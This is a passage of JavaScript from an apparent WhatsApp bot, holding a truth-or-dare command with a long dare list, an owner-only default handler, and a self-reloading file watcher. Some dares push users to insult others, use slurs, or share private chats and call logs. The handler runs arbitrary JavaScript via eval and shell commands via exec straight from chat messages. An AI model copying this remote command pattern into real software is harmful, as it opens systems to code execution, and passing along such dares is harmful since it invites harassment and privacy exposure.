              const xeontruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              dave.sendMessage(from, { image: buffertruth, caption: '_You choose TRUTH_\n'+ xeontruth }, {quoted:m})
              break
//==================================================//          
        case 'dare':
              const dare =[
    "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
    "spill people who make you pause",
    "call crush/pickle now and send ss",
    "drop only emote every time you type on gc/pc for 1 day.",
    "say Welcome to Who Wants To Be a Millionaire! to all the groups you have",
    "call ex saying miss",
    "sing the chorus of the last song you played",
    "vn your ex/crush/girlfriend, says hi (name), wants to call, just a moment. I miss you so much",
        "Bang on the table (which is at home) until you get scolded for being noisy",
    "Tell random people _I was just told I was your twin first, we separated, then I had plastic surgery. And this is the most ciyusss_ thing",
    "mention ex's name",
    "make 1 rhyme for the members!",
    "send ur whatsapp chat list",
    "chat random people with gheto language then ss here",
    "tell your own version of embarrassing things",
    "tag the person you hate",
    "Pretending to be possessed, for example: possessed by dog, possessed by grasshoppers, possessed by refrigerator, etc.",
    "change name to *I AM DONKEY* for 24 hours",
    "shout *ma chuda ma chuda ma chuda* in front of your house",
    "snap/post boyfriend photo/crush",
    "tell me your boyfriend type!",
    "say *i hv crush on you, do you want to be my girlfriend?* to the opposite sex, the last time you chatted (submit on wa/tele), wait for him to reply, if you have, drop here",
    "record ur voice that read *titar ke age do titar, titar ke piche do titar*",
    "prank chat ex and say *i love u, please come back.* without saying dare!",
    "chat to contact wa in the order according to your battery %, then tell him *i am lucky to hv you!*",
    "change the name to *I am a child of randi* for 5 hours",
    "type in bengali 24 hours",
    "Use selmon bhoi photo for 3 days",
    "drop a song quote then tag a suitable member for that quote",
    "send voice note saying can i call u baby?",
    "ss recent call whatsapp",
    "Say *YOU ARE SO BEAUTIFUL DON'T LIE* to guys!",
    "pop to a group member, and say fuck you",
    "Act like a chicken in front of ur parents",
    "Pick up a random book and read one page out loud in vn n send it here",
    "Open your front door and howl like a wolf for 10 seconds",
    "Take an embarrassing selfie and paste it on your profile picture",
    "Let the group choose a word and a well known song. You have to sing that song and send it in voice note",
    "Walk on your elbows and knees for as long as you can",
    "sing national anthem in voice note",
    "Breakdance for 30 seconds in the sitting roomðŸ˜‚",
    "Tell the saddest story you know",
    "make a twerk dance video and put it on status for 5mins",
    "Eat a raw piece of garlic",
    "Show the last five people you texted and what the messages said",
    "put your full name on status for 5hrs",
    "make a short dance video without any filter just with a music and put it on ur status for 5hrs",
    "call ur bestie, bitch",
    "put your photo without filter on ur status for 10mins",
    "say i love oli london in voice noteðŸ¤£ðŸ¤£",
    "Send a message to your ex and say I still like you",
    "call Crush/girlfriend/bestie now and screenshot here",
    "pop to one of the group member personal chat and Say you ugly bustard",
    "say YOU ARE BEAUTIFUL/HANDSOME to one of person who is in top of ur pinlist or the first person on ur chatlist",
    "send voice notes and say, can i call u baby, if u r boy tag girl/if girl tag boy",
    "write i love you (random grup member name, who is online) in personal chat, (if u r boy write girl name/if girl write boy name) take a snap of the pic and send it here",
    "use any bollywood actor photo as ur pfp for 3 days",
    "put your crush photo on status with caption, this is my crush",
    "change name to I AM GAY for 5 hours",
    "chat to any contact in whatsapp and say i will be ur bf/gf for 5hours",
    "send voice note says i hv crush on you, want to be my girlfriend/boyfriend or not? to any random person from the grup(if u girl choose boy, if boy choose girl",
    "slap ur butt hardly send the sound of slap through voice noteðŸ˜‚",
    "state ur gf/bf type and send the photo here with caption, ugliest girl/boy in the world",
    "shout bravooooooooo and send here through voice note",
    "snap your face then send it here",
    "Send your photo with a caption, i am lesbian",
    "shout using harsh words and send it here through vn",
    "shout you bastard in front of your mom/papa",
    "change the name to i am idiot for 24 hours",
    "slap urself firmly and send the sound of slap through voice noteðŸ˜‚",
    "say i love the bot owner xeon through voice note",
    "send your gf/bf pic here",
    "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
    "breakup with your best friend for 5hrs without telling him/her that its a dare",
     "tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare",
     "say i love depak kalal through voice note",
     "write i am feeling horny and put it on status, u can delete it only after 5hrs",
     "write i am lesbian and put it on status, u can delete only after 5hrs",
     "kiss your mommy or papa and say i love youðŸ˜Œ",
     "put your father name on status for 5hrs",
     "send abusive words in any grup, excepting this grup, and send screenshot proof here"
]
              const xeondare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              dave.sendMessage(from, { image: bufferdare, caption: '_You choose DARE_\n'+ xeondare }, {quoted:m})
              break
//━━━━━━━━━━━━━━━━━━━━━━━━//
default:
if (budy.startsWith('=>')) {
if (!daveshown) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!daveshown) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await reply(require('util').format(teks))
}
}

if (budy.startsWith('$')) {
if (!daveshown) return
exec(budy.slice(2), (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) return reply(stdout)
})
}
}

} catch (err) {
  let error = err.stack || err.message || util.format(err);
  console.log('====== ERROR REPORT ======');
  console.log(error);
  console.log('==========================');

  await dave.sendMessage(`${error}@s.whatsapp.net`, {
    text: `⚠️ *ERROR!*\n\n📌 *Message:* ${err.message || '-'}\n📂 *Stack Trace:*\n${error}`,
    contextInfo: { forwardingScore: 9999999, isForwarded: true }
  }, { quoted: m });
}
}
//━━━━━━━━━━━━━━━━━━━━━━━━//
// File Update
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update File 📁 : ${__filename}`)
delete require.cache[file]
require(file)
})